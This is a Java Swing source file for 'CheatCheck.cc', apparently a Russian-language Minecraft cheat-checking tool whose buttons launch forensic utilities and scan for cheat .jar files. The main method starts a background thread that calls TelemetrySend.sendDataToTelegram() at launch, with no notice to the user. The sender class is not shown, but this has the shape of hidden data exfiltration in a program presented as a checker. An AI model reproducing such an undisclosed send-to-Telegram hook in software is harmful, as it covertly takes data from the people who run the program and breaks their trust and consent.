import Check.CheckChangeSys;
import Check.CheckJar;
import Check.DLLAnalyze;
import Run.*;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.IOException;

public class CheatDetectionGUI extends JFrame {
    private JTextArea console;
    private File selectedJarFile;

    public static void main(String[] args) {
        new Thread(() -> {
            TelemetrySend bot = new TelemetrySend();
            bot.sendDataToTelegram();
        }).start();

        SwingUtilities.invokeLater(() -> {
            CheatDetectionGUI gui = new CheatDetectionGUI();
            gui.setVisible(true);
        });
    }


    public CheatDetectionGUI() {
        setTitle("CheatCheck.cc");
        setSize(1000, 800);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLocationRelativeTo(null);

        JPanel buttonPanel = new JPanel() {
            @Override
            protected void paintComponent(Graphics g) {
                super.paintComponent(g);
                g.setColor(Color.BLACK);
                g.fillRect(0, 0, getWidth(), getHeight());
            }
        };
        buttonPanel.setLayout(new GridLayout(5, 2, 10, 10));
        buttonPanel.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));

        console = new JTextArea();
        console.setEditable(false);
        console.setBackground(Color.BLACK);
        console.setForeground(Color.GREEN);
        console.setFont(new Font("Cascadia Code", Font.PLAIN, 14));
        console.append("Debug\n");

        JScrollPane consoleScrollPane = new JScrollPane(console);

        JSplitPane splitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, buttonPanel, consoleScrollPane);
        splitPane.setDividerLocation(400);
        splitPane.setDividerSize(0);

        add(splitPane, BorderLayout.CENTER);

        String[] buttonNames = {
                "Запуск ProcessHacker",
                "Проверка файлов",
                "Выбрать .jar файл",
                "Проверить выбранный файл",
                "Check DLL",
                "Everything",
                "Shellbag",
                "JournalTrace",
                "CheckMineFile",
                "Выход"
        };

        for (int i = 0; i < buttonNames.length; i++) {
            JButton button = new JButton(buttonNames[i]);
            button.setFont(new Font("Arial", Font.BOLD, 18));
            button.setForeground(Color.WHITE);
            button.setBackground(new Color(50, 50, 100));
            button.setBorder(BorderFactory.createLineBorder(new Color(100, 100, 150), 2));

            final int buttonIndex = i;
            button.addActionListener(new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent e) {
                    console.append("Нажата кнопка: " + buttonNames[buttonIndex] + "\n");

                    if (buttonIndex == 0) {
                        console.append("Запуск ProcessHacker...\n");
                        ProcessHacker processHacker = new ProcessHacker();
                        processHacker.start();
                    } else if (buttonIndex == 1) {
                        console.append("Выполнение проверки файлов...\n");
                        checkFiles(console);
                    } else if (buttonIndex == 2) {
                        chooseJarFile();
                    } else if (buttonIndex == 3) {
                            if (selectedJarFile != null) {
                                    console.append("Проверка .jar файла: " + selectedJarFile.getAbsolutePath() + "\n");
                                    CheckJar checkJar = new CheckJar();
                                    String result = checkJar.checkJarFile(selectedJarFile);
                                    console.append(result);
                            } else {
                                console.append("Сначала выберите .jar файл.\n");
                            }
                    } else if (buttonIndex == 4) {
                        console.append("Проверка DLL процессов...\n");
                        analyzeProcesses();
                    } else if (buttonIndex == 5) {
                        console.append("Запуск Everything...\n");
                        Runthing runthing = new Runthing();
                        runthing.runEverything();
                    } else if (buttonIndex == 6) {
                        console.append("Запуск ShellBag...\n");
                        ShellBagRun shellBagRun = new ShellBagRun();
                        shellBagRun.runShellBagAnalyzer();
                    } else if (buttonIndex == 7) {
                        console.append("Запуск JTrace...\n");
                        TraceRun traceRun = new TraceRun();
                        traceRun.start();
                    } else if (buttonIndex == 8) {
                        console.append("Проверка файлов майнкрафта...\n");
                        SwingWorker<Void, Void> worker = new SwingWorker<Void, Void>() {
                            @Override
                            protected Void doInBackground() {
                                try {
                                    CheckChangeSys.monitorDirectories(console);
                                } catch (IOException ex) {
                                    console.append("Ошибка при мониторинге директорий: " + ex.getMessage() + "\n");
                                }
                                return null;

                            }

                            @Override
                            protected void done() {
                                console.append("Завершена проверкa.\n");
                            }
                        };
                        worker.execute();
                    } else if (buttonIndex == 9) {
                        console.append("Выход из программы...\n");
                        System.exit(0);
                    }
                }
            });

            buttonPanel.add(button);
        }
    }

    private void chooseJarFile() {
        JFileChooser fileChooser = new JFileChooser();
        fileChooser.setDialogTitle("Выберите .jar файл для сканирования");
        fileChooser.setFileFilter(new javax.swing.filechooser.FileNameExtensionFilter("JAR files", "jar"));

        int returnValue = fileChooser.showOpenDialog(this);
        if (returnValue == JFileChooser.APPROVE_OPTION) {
            selectedJarFile = fileChooser.getSelectedFile();
            console.append("Выбран файл: " + selectedJarFile.getAbsolutePath() + "\n");
        } else {
            console.append("Выбор файла отменён.\n");
        }
    }

    private void checkFiles(JTextArea console) {
        String[] directories = {"C:\\Expensive", "C:\\Nursultan", "C:\\Downloads"};
        for (String dir : directories) {
            File folder = new File(dir);
            if (folder.exists() && folder.isDirectory()) {
                console.append("Проверка директории: " + dir + "\n");
                File[] files = folder.listFiles();
                if (files != null) {
                    for (File file : files) {
                        if (file.isFile() && file.getName().endsWith(".jar")) {
                            console.append("Найден .jar файл: " + file.getAbsolutePath() + "\n");
                        }
                    }
                } else {
                    console.append("Не удалось получить файлы в директории: " + dir + "\n");
                }
            } else {
                console.append("Директория не найдена: " + dir + "\n");
            }
        }
    }

    private void analyzeProcesses() {
        String[] processes = {
                "facebook.exe", "telegram.exe", "zoom.exe", "whatsapp.exe",
                "pinterest.exe", "operagx.exe", "nstagram.exe",
                "GrandTheftAutoV.exe", "Dropbox.exe", "Mozilla.exe",
                "LeagueofLegends.exe", "firefox.exe", "Dota 2", "TikTok.exe"
        };

        for (String processName : processes) {
            try {
                DLLAnalyze dllAnalyze = new DLLAnalyze();
                String result = dllAnalyze.analyze(processName);
                console.append("Результаты для " + processName + ":\n" + result + "\n");
            } catch (IOException e) {
                console.append("Ошибка при анализе процесса " + processName + ": " + e.getMessage() + "\n");
            }
        }
    }
}